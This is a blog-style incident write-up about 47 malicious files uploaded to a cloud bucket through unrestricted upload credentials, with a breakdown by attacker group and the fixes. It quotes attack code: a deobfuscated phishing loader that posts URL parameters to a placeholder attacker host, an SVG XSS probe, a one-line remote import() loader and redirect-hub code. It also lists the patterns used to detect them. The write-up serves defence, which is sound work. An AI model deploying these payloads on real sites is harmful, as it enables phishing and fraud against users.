---
title: "Our Cloud Provider Found 1 Malicious File in Our Bucket — We Found 47"
description: "A security alert on one malicious file led us to scan the whole bucket. We found 47 files spanning 15 months — XSS probes, redirect hubs, obfuscated phishing pages. The cloud provider's scanner caught one."
date: 2026-03-14
draft: false
slug: "cloud-bucket-malicious-upload"
categories:
    - Incidents
tags:
    - Security
    - Cloud Storage
    - Troubleshooting
---

We got a security ticket from our cloud provider: a malicious file was detected in one of our object storage buckets. Please handle it.

It was an HTML file. On the surface, a loading page: blue spinner, text saying "Loading, please wait..." Looked harmless.

It was a phishing page.

After cleaning it up, we decided to scan the entire bucket. We found **47 malicious files, the earliest uploaded 15 months prior**. The cloud provider's scanner had caught exactly one.

---

## What the "Loading" Page Actually Did

This is what the user sees:

```html
<div id="loading">
  <div>
    <div class="spinner"></div>
    <div class="loading-text">Loading, please wait...</div>
  </div>
</div>
```

A standard loading animation. No one would suspect anything.

But the `<script>` tag contained obfuscated JavaScript, processed by a commercial JS obfuscation service. The raw code looked like this (`_0x` variable names, base64-encoded strings, RC4 decryption layers):

```javascript
var _0x1a2b='jsjiami.com.v7';
function _0x3de7(){const _0x2c645c=(function(){return[_0x1a2b,
'EFbjRkusyjTgIiSUFamti.cRhoVAgmeO.EvH7MAg==','jSk2bSogW7/dTCk5WRadca',
// ... hundreds more lines of this
```

After deobfuscating the string array (RC4-encoded, indexed by a lookup function) and tracing the control flow, the core logic roughly translates to:

```javascript
document.addEventListener('DOMContentLoaded', function() {
  // 1. Read the URL query string
  const qs = window.location.search.substring(1);

  // 2. POST query params to an attacker-controlled server
  const formData = new FormData();
  formData.append('data', qs);
  fetch('https://<attacker-api>/...', {
    method: 'POST',
    body: formData
  })
  .then(res => res.json())
  .then(data => {
    // 3. Server returns base64-encoded HTML, replaces the entire page
    document.open();
    document.write(atob(data.content));
    document.close();
  });
});
```

The attack chain:

1. Attacker sends a link to the victim: `https://your-legitimate-domain/path/loading.html?r=xxx&token=yyy`
2. Victim sees "Loading...", looks normal
3. The page POSTs URL parameters to the attacker's server
4. Server returns a base64-encoded page (phishing form, gambling redirect, or anything else the attacker chooses)
5. `document.write` replaces the entire page with attacker-controlled content

The key: **the phishing page runs on your legitimate domain**. The victim sees a trusted domain in the address bar, which lowers their guard.

---

## How We Found the Other 46

The cloud provider's ticket only flagged one file. But if an attacker uploaded one, there were probably more.

We wrote a Python script using the cloud storage SDK to scan every file in the bucket. The approach was simple: list all objects, flag anything with a suspicious extension (`.html`, `.htm`, `.js`, `.php`, `.svg`), then download and inspect the flagged files for malicious patterns like `_0x` variable names, `eval(`, `document.write(atob`, `onload=import(`, and known obfuscation service markers.

The scan finished in a few minutes. It found 75 files with suspicious extensions. We expected some false positives (user agreements, terms of service pages), so we ran a second pass: download each file, classify by content, separate legitimate business files from actual threats.

The result: 47 malicious files, 2 legitimate business pages, and the rest were misnamed images (PNG files with `.html` extensions, harmless but telling of the upload validation gap).

The earliest file was from November 2024. The most recent was from a few days ago. Fifteen months of ongoing operation.

---

## The Full Picture: 47 Files, 4 Attacker Groups

Our initial assumption was that we were looking at one attacker iterating from simple to complex. The timeline disproved that. The earliest file (November 2024) was a fully operational traffic redirect hub with jQuery and WeChat detection. Seven months later, a one-line `<svg onload=alert(0)>` probe appeared — from a completely different upload path, hitting a completely different backend domain.

We analyzed all 47 files. Zero domain overlap between groups. Completely different obfuscation techniques. Different upload path prefixes, meaning different hijacked user sessions. Conclusion: at least four independent attacker groups found and exploited the same bucket, each with their own infrastructure.

### Group A: XSS Probe + Remote Script Loaders (~30 files)

The most prolific group by file count. Their approach was methodical:

**Step 1 — Probe:**

```html
<svg onload=alert(0)>
```

One line. Testing whether the bucket serves files that execute JavaScript in the browser. The answer was yes — SVG script execution confirmed. The bucket served files without a `Content-Disposition: attachment` header, so the browser rendered them directly.

**Step 2 — Batch deployment:**

```html
<body onload=import("//<attacker-cdn>/payload.js")>
```

Also one line. Using `import()` to dynamically load a remote JS module hosted on Alibaba Cloud OSS. Each file was only 71 bytes. (This requires the attacker-controlled CDN to serve the file with permissive CORS headers — a setup cost, but not a meaningful barrier.) They uploaded 20 copies in quick succession with incrementing filenames (`tmp_xxx0.html`, `tmp_xxx1.html`...), then another batch of 10 two months later with a different payload URL on the same CDN.

A third batch contained nested `<html>` pages at 1.6KB each — more structured than the one-liners, still from the same upload path prefix.

### Group B: Traffic Redirect Hub (7 files)

The earliest attacker to find the bucket (November 2024) and the most technically mature. Two types of files:

**Redirect pages** (5 files, 178KB each, uploaded within 73 seconds):

```html
<title>Official Verification</title>
```

These looked like phishing pages at first glance. 178KB each, with a title claiming "Official Verification." But the actual code told a different story.

Buried under a full copy of jQuery 3.6.4 (to look legitimate and inflate the file size), the real logic was just a few lines:

```javascript
$(function() {
    let data = decodeURIComponent(window.location.search.substr(1));
    let apiEndpoint = 'https://<attacker-api>/rpa.php';
    data = data.split('data=')[1]
    $.get(apiEndpoint, { data: data }, function(data) {
        iframe(data.data)
    });
});

function iframe(src) {
    const isWeChat = /MicroMessenger/i.test(navigator.userAgent);
    const isQQ = /QQ/i.test(navigator.userAgent);

    if(!isWeChat && !isQQ){
        top.location.href = src;  // Regular browser: full redirect
        return;
    }
    // WeChat/QQ: embed in iframe to bypass external link warnings
    $("#iframe").html('<iframe src="' + src + '" ...></iframe>');
}
```

This is not a phishing page. It is a **traffic redirect hub**. The backend (`rpa.php`) dynamically decides where to send the visitor. The page itself is just a relay. The actual destination could be anything: gambling, fraud, pornography, phishing, app downloads. The attacker controls it server-side and can change it at any time.

The WeChat/QQ user agent detection is telling. These pages were designed to spread through Chinese social messaging apps. In a regular browser, the page does a full redirect. In WeChat or QQ, it loads the target in an iframe instead, because these apps intercept top-level navigations for content filtering, while iframes bypass those hooks.

The page also blocks F12 with a fake alert: "Thank you for using the management platform. Console operations are prohibited." A small touch to discourage curious users from inspecting the source.

When the cloud provider eventually flagged one of these files months later, they classified it as "pornographic content." They were not wrong, exactly. At the time they scanned it, the backend happened to be redirecting to pornographic sites. But they missed the bigger picture: this was a general-purpose traffic distribution platform, not a static porn page. The redirect target could change hourly.

**CDN API proxy** (1 file):

```html
<!-- Upload this file to CDN, can be used as an API endpoint -->
```

The attacker left a comment explaining their intent. An HTML file hosted on a CDN becomes an API relay when its JavaScript reads query parameters and forwards them to an attacker-controlled endpoint — requests then appear to originate from your domain, bypassing IP blocks or origin restrictions on the attacker's real infrastructure. This proxy used a different domain but the same `rpa.php` endpoint pattern, linking it to the same group.

### Group C: Obfuscated Phishing (8 files)

The group that triggered the cloud provider alert. They deployed **byte-identical files across three different hijacked user sessions** — the strongest evidence that the same attacker was operating across multiple compromised accounts.

Two techniques:

**Custom obfuscation** (base64 + XOR, backed by `dunapi.sqsafk.cn`): loading animation with a "loding" typo in the title, custom XOR decryption layer, remote content injection.

**Commercial obfuscation** (jsjiami.com v7): the loading page described at the top of this article. Full loading animation, RC4 + base64 multi-layer decryption, `document.write()` page replacement. The most recent file was uploaded days before the cloud provider's alert.

They also deployed a fake news page mimicking a well-known Chinese content platform, designed to harvest user information.

### Group D: PNG Steganography (2 files)

The most unusual technique. Files started with real PNG/JFIF image headers (passing basic file type checks), followed by a hidden `<div>` containing base64 + XOR encoded JavaScript. A custom decoder function extracted and executed the payload, loading a remote script from yet another domain with no connection to any of the other groups.

### How We Know They Are Independent

| Evidence | What it shows |
|----------|--------------|
| Zero domain overlap | Five distinct backend domain clusters, no file in any group references a domain from another group |
| Different techniques | Bare HTML, jQuery wrapper, base64+XOR, jsjiami commercial obfuscation, PNG steganography — five different approaches |
| Different upload paths | Each group operated from different hijacked user sessions |
| Cross-tenant identical files | Group C deployed the same file across three user paths — proving one attacker, multiple sessions |
| Timeline vs. sophistication | Group B (fully operational redirect hub) appeared 7 months before Group A (one-line XSS probe) — not a plausible iteration sequence |

---

## How the Attackers Got Upload Access

Our bucket was private-write, public-read. Users cannot upload directly to the bucket. The upload flow was standard:

```
Frontend → requests upload credential from backend API
Backend  → generates temporary credential (STS token or pre-signed URL)
Frontend → uploads directly to object storage using the credential
```

This is the textbook pattern recommended by every cloud provider. The architecture was fine.

The problem: **the credentials had no restrictions**.

- No Content-Type constraint. Any file type could be uploaded.
- No file extension validation. `.html`, `.js`, `.php` all accepted.
- No path restriction. The attacker could set any object key.
- Credential TTL was in hours. Plenty of time.

All an attacker needed to do:

1. Hijack an existing user's session (accounts are admin-provisioned, not self-registered)
2. Call the upload API to get a credential
3. Upload an `.html` file using that credential
4. Construct the public URL and start distributing

No exploit needed. No vulnerability in the traditional sense. Just "legitimate" use of an overly permissive API. Four independent groups found and exploited the same gap over 15 months.

---

## Why It Went Undetected for 15 Months

No monitoring.

- No alerting on uploaded file types
- No detection for unusual extensions
- No periodic scan of existing files
- Access logs were enabled, but nobody looked at them

And the cloud provider's scanner? 47 malicious files over 15 months, and it caught 1. This is not surprising. Cloud-side security scanning operates at massive scale with conservative rules, primarily relying on signature matching. Obfuscated code, one-line `import()` loaders, and base64 dynamic injection are designed to evade exactly this kind of detection.

Your bucket, your responsibility. Cloud provider scanning is a backstop, not a defense.

---

## The Fix

Lock Content-Type at credential generation. For pre-signed URLs: include `Content-Type` as a signed header — a mismatch causes signature verification to fail before the file is accepted. For STS temporary credentials: add a Content-Type condition to the session policy. Both enforce the restriction at the infrastructure level, with no application code needed. Consult your provider's IAM/CAM policy docs for the exact condition key and operator names.

```json
// Illustrative only. Condition key ("content-type" vs "cos:content-type") and
// operator ("string_equal" vs "StringEquals") differ by provider.
// Consult your provider's IAM/CAM policy documentation for exact syntax.
{
  "effect": "allow",
  "action": ["PutObject"],
  "condition": {
    "string_equal": {
      "content-type": ["image/jpeg", "image/png", "image/gif"]
    }
  }
}
```

Server-generated keys: the frontend sends only the file extension (validated server-side), and the backend generates the full object key with a random UUID. The attacker cannot control the path.

Shorter TTL: hours-level down to 10-15 minutes. This limits residual exposure after a session compromise; pair it with server-generated keys to also eliminate path-control abuse.

Response headers: configure the CDN or a cloud function trigger to set `Content-Disposition: attachment` for non-image types — this forces a download regardless of file content. `X-Content-Type-Options: nosniff` is a separate concern: it prevents MIME sniffing for script and style resources, but has no effect on HTML rendering.

Monitor upload extensions: any `.html` or `.js` file appearing in a bucket that should only contain images is a zero-tolerance alert.

---

## Takeaway

1. "Private write" does not mean secure. As long as you have an upload API that hands out credentials, and those credentials are unrestricted, attackers can upload anything.

2. An unguarded bucket gets found by multiple parties independently. We initially assumed one attacker iterating over 15 months. The evidence showed at least four independent groups — different domains, different techniques, different hijacked sessions — all exploiting the same unrestricted upload API. This was not a targeted attack. It was an open door that kept getting discovered. Your domain reputation was funding all of them.

3. Do not rely on your cloud provider's security scanner. 47 files, 15 months, 1 detection. When they finally flagged one, they classified it as "pornographic content" because the dynamic redirect happened to be pointing at porn that day. They missed that it was a general-purpose traffic distribution platform. Signature-based scanning cannot keep up with server-controlled dynamic payloads. Run your own scans.

4. Add `Content-Type` to your pre-signed URL signature or STS policy condition. This single change blocks the entire attack vector. If your upload API does not restrict file types today, fix it now — it takes one line in the signing config.
